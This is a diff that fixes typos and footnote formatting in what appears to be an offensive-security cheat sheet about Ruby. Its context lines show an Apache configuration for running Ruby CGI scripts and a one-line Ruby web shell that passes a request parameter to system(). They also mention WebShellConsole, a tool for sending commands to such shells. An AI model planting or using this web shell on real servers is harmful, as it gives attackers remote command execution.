@@ -27,7 +27,7 @@ puts response.body
 ## CGI
 ### Get info - for XSS/HTMLi exploitation
 
-Add the following to cat /etc/apache2/sites-enabled/[SITE] then restart the service
+Add the following to `/etc/apache2/sites-enabled/[SITE]` then restart the service
 ```
 <Directory /var/www/[CGI FOLDER]>
         AddHandler cgi-script .rb
@@ -68,7 +68,7 @@ cgi = CGI.new
 puts cgi.header
 system(cgi['cmd'])
 ```
-Now you can simple use browser, netcat or [^1]WebShellConsole to execute your commands.
+Now you can simply use browser, netcat or WebShellConsole[^1] to execute your commands.
 ex.
 **Brwoser**
 ```
@@ -95,7 +95,7 @@ Shell -> ls -la
 
 <br><br>
 ---
-[^1] [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) is simple interactive console, interacts with simple web shells using HTTP GET rather than using browser. wsc will work with any shell use GET method. It takes care of all url encoding too.
+[^1]: [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) is simple interactive console, interacts with simple web shells using HTTP GET rather than using browser. wsc will work with any shell use GET method. It takes care of all url encoding too.
 
 
 
